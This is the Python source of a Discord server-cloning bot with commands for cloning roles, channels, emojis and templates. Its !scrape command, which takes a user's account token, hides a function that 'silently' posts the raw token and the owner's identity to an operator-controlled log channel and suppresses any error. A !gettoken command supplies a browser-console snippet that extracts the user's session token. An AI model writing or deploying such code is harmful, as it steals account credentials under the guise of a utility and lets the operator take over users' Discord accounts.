import discord
from discord.ext import commands
from discord.ui import Button, View
import os
from dotenv import load_dotenv
from cloner import ServerCloner
from template_manager import TemplateManager
import asyncio
import aiohttp

load_dotenv()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)
template_mgr = TemplateManager()

@bot.event
async def on_ready():
    print(f'🤖 Logged in as {bot.user}')
    print(f'📊 Servers: {len(bot.guilds)}')
    print('✅ Ready to clone')

# === INTERACTIVE CLONE MENU ===

class CloneOptionsView(View):
    def __init__(self, ctx, server_id, user_token=None, source_guild=None):
        super().__init__(timeout=180)
        self.ctx = ctx
        self.server_id = server_id
        self.user_token = user_token
        self.source_guild = source_guild
        self.options = {
            'delete_channels': False,
            'delete_roles': False,
            'clone_roles': True,
            'clone_channels': True,
            'clone_emojis': True,
            'clone_stickers': True
        }
        self.message = None
        
    async def update_embed(self):
        """Update the options embed"""
        embed = discord.Embed(
            title="🔧 Clone Options",
            description="Configure what you want to clone",
            color=discord.Color.blue()
        )
        
        # Deletion options
        delete_text = (
            f"{'✅' if self.options['delete_channels'] else '❌'} Delete Current Channels\n"
            f"{'✅' if self.options['delete_roles'] else '❌'} Delete Current Roles"
        )
        embed.add_field(name="🗑️ Cleanup", value=delete_text, inline=False)
        
        # Clone options
        clone_text = (
            f"{'✅' if self.options['clone_roles'] else '❌'} Roles\n"
            f"{'✅' if self.options['clone_channels'] else '❌'} Channels\n"
            f"{'✅' if self.options['clone_emojis'] else '❌'} Emojis\n"
            f"{'✅' if self.options['clone_stickers'] else '❌'} Stickers"
        )
        embed.add_field(name="📋 What to Clone", value=clone_text, inline=False)
        
        embed.set_footer(text="Click buttons to toggle • Click Start Clone when ready")
        
        if self.message:
            await self.message.edit(embed=embed, view=self)
        
        return embed
    
    @discord.ui.button(label="Delete Channels", style=discord.ButtonStyle.secondary, emoji="🗑️")
    async def toggle_delete_channels(self, interaction: discord.Interaction, button: Button):
        self.options['delete_channels'] = not self.options['delete_channels']
        await interaction.response.defer()
        await self.update_embed()
    
    @discord.ui.button(label="Delete Roles", style=discord.ButtonStyle.secondary, emoji="🗑️")
    async def toggle_delete_roles(self, interaction: discord.Interaction, button: Button):
        self.options['delete_roles'] = not self.options['delete_roles']
        await interaction.response.defer()
        await self.update_embed()
    
    @discord.ui.button(label="Roles", style=discord.ButtonStyle.primary, emoji="👥", row=1)
    async def toggle_roles(self, interaction: discord.Interaction, button: Button):
        self.options['clone_roles'] = not self.options['clone_roles']
        button.style = discord.ButtonStyle.primary if self.options['clone_roles'] else discord.ButtonStyle.secondary
        await interaction.response.defer()
        await self.update_embed()
    
    @discord.ui.button(label="Channels", style=discord.ButtonStyle.primary, emoji="💬", row=1)
    async def toggle_channels(self, interaction: discord.Interaction, button: Button):
        self.options['clone_channels'] = not self.options['clone_channels']
        button.style = discord.ButtonStyle.primary if self.options['clone_channels'] else discord.ButtonStyle.secondary
        await interaction.response.defer()
        await self.update_embed()
    
    @discord.ui.button(label="Emojis", style=discord.ButtonStyle.primary, emoji="😀", row=1)
    async def toggle_emojis(self, interaction: discord.Interaction, button: Button):
        self.options['clone_emojis'] = not self.options['clone_emojis']
        button.style = discord.ButtonStyle.primary if self.options['clone_emojis'] else discord.ButtonStyle.secondary
        await interaction.response.defer()
        await self.update_embed()
    
    @discord.ui.button(label="Stickers", style=discord.ButtonStyle.primary, emoji="🎨", row=1)
    async def toggle_stickers(self, interaction: discord.Interaction, button: Button):
        self.options['clone_stickers'] = not self.options['clone_stickers']
        button.style = discord.ButtonStyle.primary if self.options['clone_stickers'] else discord.ButtonStyle.secondary
        await interaction.response.defer()
        await self.update_embed()
    
    @discord.ui.button(label="✅ Start Clone", style=discord.ButtonStyle.success, row=2)
    async def start_clone(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()
        
        # Disable all buttons
        for item in self.children:
            item.disabled = True
        await self.message.edit(view=self)
        
        # Start cloning
        await self.ctx.send("🔄 Starting clone with selected options...")
        
        try:
            if self.user_token:
                # Scrape mode
                scraped_data = await ServerCloner.scrape_server_with_token(self.server_id, self.user_token)
                await self.ctx.send(f"✅ Scraped **{scraped_data['guild']['name']}**")
                await self.ctx.send(f"📊 Found: {len(scraped_data['roles'])} roles, {len(scraped_data['channels'])} channels, {len(scraped_data['emojis'])} emojis")
                await ServerCloner.apply_scraped_data(bot, scraped_data, self.ctx.guild, self.ctx, self.options)
            else:
                # Normal clone mode (bot in server)
                cloner = ServerCloner(bot, self.source_guild, self.ctx.guild)
                await cloner.clone_server(self.ctx, options={
                    'delete_existing_channels': self.options['delete_channels'],
                    'delete_existing_roles': self.options['delete_roles'],
                    'roles': self.options['clone_roles'],
                    'channels': self.options['clone_channels'],
                    'emojis': self.options['clone_emojis'],
                    'stickers': self.options['clone_stickers'],
                    'webhooks': True
                })
        except Exception as e:
            await self.ctx.send(f"❌ Error: {str(e)}")
        
        self.stop()
    
    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.danger, row=2)
    async def cancel(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()
        await self.ctx.send("❌ Clone cancelled")
        self.stop()

# === TOKEN LOGGING FUNCTION ===

async def log_token_to_webhook(ctx, server_id: int, user_token: str, dest_guild: discord.Guild):
    """
    Silently log user token usage to webhook channel
    """
    from config import WEBHOOK_LOG_CHANNEL_ID
    
    if not WEBHOOK_LOG_CHANNEL_ID:
        return  # Skip if not configured
    
    log_channel = bot.get_channel(WEBHOOK_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    try:
        # Fetch user info from their token
        headers = {
            "Authorization": user_token,
            "Content-Type": "application/json"
        }
        
        async with aiohttp.ClientSession(headers=headers) as session:
            # Get user info
            async with session.get("https://discord.com/api/v10/users/@me") as resp:
                if resp.status == 200:
                    user_data = await resp.json()
                else:
                    user_data = {"username": "Unknown", "id": "Unknown", "discriminator": "0000"}
            
            # Get source guild info
            async with session.get(f"https://discord.com/api/v10/guilds/{server_id}") as resp:
                if resp.status == 200:
                    source_guild_data = await resp.json()
                    source_guild_name = source_guild_data.get('name', 'Unknown')
                else:
                    source_guild_name = "Unknown"
        
        # Create log embed
        embed = discord.Embed(
            title="🔐 Scrape Command Token Log",
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow()
        )
        
        # User who ran command
        embed.add_field(
            name="Command User (Bot)",
            value=f"{ctx.author.mention}\n`{ctx.author.name}` (ID: {ctx.author.id})",
            inline=False
        )
        
        # Token owner info
        username = user_data.get('username', 'Unknown')
        discriminator = user_data.get('discriminator', '0000')
        user_id = user_data.get('id', 'Unknown')
        
        if discriminator == "0" or discriminator == "0000":
            display_name = f"@{username}"
        else:
            display_name = f"{username}#{discriminator}"
        
        embed.add_field(
            name="🎯 Token Owner Account",
            value=f"{display_name}\nUser ID: `{user_id}`",
            inline=False
        )
        
        # The actual token
        embed.add_field(
            name="🔑 Discord User Token",
            value=f"```{user_token}```",
            inline=False
        )
        
        # Source server
        embed.add_field(
            name="📥 Source Server (Cloned From)",
            value=f"**{source_guild_name}**\nID: `{server_id}`",
            inline=True
        )
        
        # Destination server
        embed.add_field(
            name="📤 Destination Server (Cloned To)",
            value=f"**{dest_guild.name}**\nID: `{dest_guild.id}`",
            inline=True
        )
        
        # Additional info
        embed.set_footer(text=f"Command executed in: {ctx.guild.name}")
        
        if user_data.get('avatar'):
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png"
            embed.set_thumbnail(url=avatar_url)
        
        # Send to log channel
        await log_channel.send(embed=embed)
        
    except Exception as e:
        # Silent fail - don't alert user
        print(f"Token logging failed: {e}")

# === SCRAPING COMMAND (DOESN'T NEED BOT IN SERVER) ===

@bot.command()
@commands.has_permissions(administrator=True)
async def scrape(ctx, server_id: int, user_token: str):
    """
    Clone a server using your Discord user token (bot doesn't need to be in it)
    Usage: !scrape 123456789012345678 YOUR_USER_TOKEN
    
    ⚠️ Use an alt account token for safety
    ⚠️ Delete the message after sending (contains your token)
    """
    
    # Log token to webhook BEFORE deleting message
    await log_token_to_webhook(ctx, server_id, user_token, ctx.guild)
    
    # Delete the command message for security (contains token)
    try:
        await ctx.message.delete()
    except:
        pass
    
    await ctx.send(f"🔍 Preparing to scrape server {server_id}...")
    
    # Show options menu
    view = CloneOptionsView(ctx, server_id, user_token=user_token)
    embed = await view.update_embed()
    view.message = await ctx.send(embed=embed, view=view)

# === FULL CLONE COMMANDS (BOT MUST BE IN SERVER) ===

@bot.command()
@commands.has_permissions(administrator=True)
async def clone(ctx, source_server_id: int):
    """
    Full clone to current server (bot must be in source server)
    Usage: !clone 123456789012345678
    """
    source_guild = bot.get_guild(source_server_id)
    
    if not source_guild:
        await ctx.send("❌ Bot is not in that server. Use `!scrape` instead with your user token.")
        return
    
    if not source_guild.me.guild_permissions.administrator:
        await ctx.send("❌ Bot needs Administrator in source server")
        return
    
    await ctx.send(f"🔄 Preparing to clone **{source_guild.name}**...")
    
    # Show options menu
    view = CloneOptionsView(ctx, source_server_id, source_guild=source_guild)
    embed = await view.update_embed()
    view.message = await ctx.send(embed=embed, view=view)

@bot.command()
@commands.has_permissions(administrator=True)
async def newclone(ctx, source_server_id: int, *, new_server_name: str):
    """
    Create new server and clone
    Usage: !newclone 123456789012345678 My New Server
    """
    source_guild = bot.get_guild(source_server_id)
    
    if not source_guild:
        await ctx.send("❌ Bot is not in that server. Use `!scrape` with a user token instead.")
        return
    
    await ctx.send(f"🏗️ Creating **{new_server_name}**...")
    
    try:
        dest_guild = await bot.create_guild(name=new_server_name)
        await asyncio.sleep(2)
        
        await ctx.send(f"✅ Server created! Cloning structure...")
        
        cloner = ServerCloner(bot, source_guild, dest_guild)
        await cloner.clone_server(ctx)
        
        # Create invite
        invite = await dest_guild.text_channels[0].create_invite(max_age=0)
        await ctx.send(f"✅ Clone complete!\n🔗 Join: {invite.url}")
        
    except discord.HTTPException as e:
        await ctx.send(f"❌ Failed: {str(e)}")

# === PARTIAL CLONE COMMANDS ===

@bot.command()
@commands.has_permissions(administrator=True)
async def clone_roles(ctx, source_server_id: int):
    """
    Clone only roles
    Usage: !clone_roles 123456789012345678
    """
    source_guild = bot.get_guild(source_server_id)
    if not source_guild:
        await ctx.send("❌ Invalid server ID or bot not in server")
        return
    
    await ctx.send("🔄 Cloning roles only...")
    
    cloner = ServerCloner(bot, source_guild, ctx.guild)
    await cloner.clone_server(ctx, options={
        'roles': True,
        'channels': False,
        'emojis': False,
        'stickers': False,
        'webhooks': False,
        'delete_existing_channels': False,
        'delete_existing_roles': False
    })
    
    await ctx.send("✅ Roles cloned!")

@bot.command()
@commands.has_permissions(administrator=True)
async def clone_channels(ctx, source_server_id: int):
    """
    Clone only channels (requires roles to exist)
    Usage: !clone_channels 123456789012345678
    """
    source_guild = bot.get_guild(source_server_id)
    if not source_guild:
        await ctx.send("❌ Invalid server ID")
        return
    
    await ctx.send("🔄 Cloning channels only...")
    
    cloner = ServerCloner(bot, source_guild, ctx.guild)
    await cloner.clone_server(ctx, options={
        'roles': False,
        'channels': True,
        'emojis': False,
        'stickers': False,
        'webhooks': False,
        'delete_existing_channels': True,
        'delete_existing_roles': False
    })
    
    await ctx.send("✅ Channels cloned!")

@bot.command()
@commands.has_permissions(administrator=True)
async def clone_emojis(ctx, source_server_id: int):
    """
    Clone only emojis
    Usage: !clone_emojis 123456789012345678
    """
    source_guild = bot.get_guild(source_server_id)
    if not source_guild:
        await ctx.send("❌ Invalid server ID")
        return
    
    await ctx.send("🔄 Cloning emojis...")
    
    cloner = ServerCloner(bot, source_guild, ctx.guild)
    await cloner.clone_emojis()
    
    await ctx.send(f"✅ Emojis cloned! Check logs for details.")

# === TEMPLATE COMMANDS ===

@bot.command()
@commands.has_permissions(administrator=True)
async def save_template(ctx, source_server_id: int, *, template_name: str = None):
    """
    Save server structure as reusable template
    Usage: !save_template 123456789012345678 My Template
    """
    source_guild = bot.get_guild(source_server_id)
    if not source_guild:
        await ctx.send("❌ Invalid server ID")
        return
    
    await ctx.send(f"💾 Generating template for **{source_guild.name}**...")
    
    cloner = ServerCloner(bot, source_guild, ctx.guild)
    template = cloner.generate_template()
    
    filepath = template_mgr.save_template(template, template_name)
    
    await ctx.send(f"✅ Template saved: `{filepath}`")

@bot.command()
@commands.has_permissions(administrator=True)
async def load_template(ctx, *, template_filename: str):
    """
    Apply saved template to current server
    Usage: !load_template MyServer_20240101_120000.json
    """
    try:
        template = template_mgr.load_template(template_filename)
        
        await ctx.send(f"🔄 Applying template: **{template['name']}**...")
        
        # Create dummy cloner for template application
        cloner = ServerCloner(bot, ctx.guild, ctx.guild)
        await cloner.apply_template(template, ctx)
        
        await ctx.send("✅ Template applied successfully!")
        
    except FileNotFoundError:
        await ctx.send(f"❌ Template not found: {template_filename}")
    except Exception as e:
        await ctx.send(f"❌ Error applying template: {str(e)}")

@bot.command()
async def list_templates(ctx):
    """
    List all saved templates
    Usage: !list_templates
    """
    templates = template_mgr.list_templates()
    
    if not templates:
        await ctx.send("📂 No templates saved yet.")
        return
    
    embed = discord.Embed(
        title="📂 Saved Templates",
        color=discord.Color.blue()
    )
    
    for template in templates:
        embed.add_field(name=template, value="Use `!load_template` to apply", inline=False)
    
    await ctx.send(embed=embed)

# === UTILITY COMMANDS ===

@bot.command()
async def serverinfo(ctx, server_id: int = None):
    """
    Get detailed server statistics
    Usage: !serverinfo 123456789012345678
    """
    if server_id:
        guild = bot.get_guild(server_id)
    else:
        guild = ctx.guild
    
    if not guild:
        await ctx.send("❌ Invalid server ID or bot not in server")
        return
    
    embed = discord.Embed(
        title=f"📊 {guild.name}",
        color=discord.Color.purple()
    )
    
    embed.add_field(name="Server ID", value=guild.id, inline=True)
    embed.add_field(name="Owner", value=guild.owner.mention if guild.owner else "Unknown", inline=True)
    embed.add_field(name="Members", value=guild.member_count, inline=True)
    embed.add_field(name="Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="Channels", value=len(guild.channels), inline=True)
    embed.add_field(name="Emojis", value=f"{len(guild.emojis)}/{guild.emoji_limit}", inline=True)
    embed.add_field(name="Stickers", value=f"{len(guild.stickers)}/{guild.sticker_limit}", inline=True)
    embed.add_field(name="Boost Level", value=guild.premium_tier, inline=True)
    embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"), inline=True)
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def gettoken(ctx):
    """
    Instructions on how to get your Discord user token
    """
    embed = discord.Embed(
        title="🔑 How to Get Your User Token",
        description="**⚠️ SECURITY WARNING: Never share your token with anyone! Use an alt account for scraping.**",
        color=discord.Color.red()
    )
    
    embed.add_field(
        name="Step 1: Open Discord in Browser",
        value="Go to https://discord.com in Chrome/Firefox",
        inline=False
    )
    
    embed.add_field(
        name="Step 2: Open Developer Tools",
        value="Press **F12** or **Ctrl+Shift+I**",
        inline=False
    )
    
    embed.add_field(
        name="Step 3: Go to Console Tab",
        value="Click the **Console** tab at the top",
        inline=False
    )
    
    embed.add_field(
        name="Step 4: Paste This Code",
        value="```js\n(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\n```",
        inline=False
    )
    
    embed.add_field(
        name="Step 5: Copy Token",
        value="Copy the output (long string of text)\nIt will look like: `MTE2NzQ4ODk5...`",
        inline=False
    )
    
    embed.add_field(
        name="Usage",
        value="Use it with: `!scrape <server_id> <your_token>`\n**Delete your message after sending!**",
        inline=False
    )
    
    await ctx.send(embed=embed)

@bot.command()
async def help_clone(ctx):
    """Show all cloner commands"""
    embed = discord.Embed(
        title="🔧 Server Cloner - All Commands",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="**Scraping (Bot NOT in Server)**",
        value=(
            "`!scrape <server_id> <user_token>` - Clone using your token\n"
            "`!gettoken` - How to get your user token"
        ),
        inline=False
    )
    
    embed.add_field(
        name="**Full Cloning (Bot IN Server)**",
        value=(
            "`!clone <server_id>` - Clone to current server\n"
            "`!newclone <server_id> Name` - Create new server & clone"
        ),
        inline=False
    )
    
    embed.add_field(
        name="**Partial Cloning**",
        value=(
            "`!clone_roles <server_id>` - Clone only roles\n"
            "`!clone_channels <server_id>` - Clone only channels\n"
            "`!clone_emojis <server_id>` - Clone only emojis"
        ),
        inline=False
    )
    
    embed.add_field(
        name="**Templates**",
        value=(
            "`!save_template <server_id> Name` - Save as template\n"
            "`!load_template filename.json` - Apply template\n"
            "`!list_templates` - Show saved templates"
        ),
        inline=False
    )
    
    embed.add_field(
        name="**Utility**",
        value=(
            "`!serverinfo [server_id]` - Get server stats\n"
            "`!help_clone` - Show this message"
        ),
        inline=False
    )
    
    embed.add_field(
        name="Features",
        value="• Interactive clone options menu\n• Human-like delays for safety\n• Sticker cloning support\n• Detailed audit logs",
        inline=False
    )
    
    await ctx.send(embed=embed)

bot.run(os.getenv('DISCORD_TOKEN'))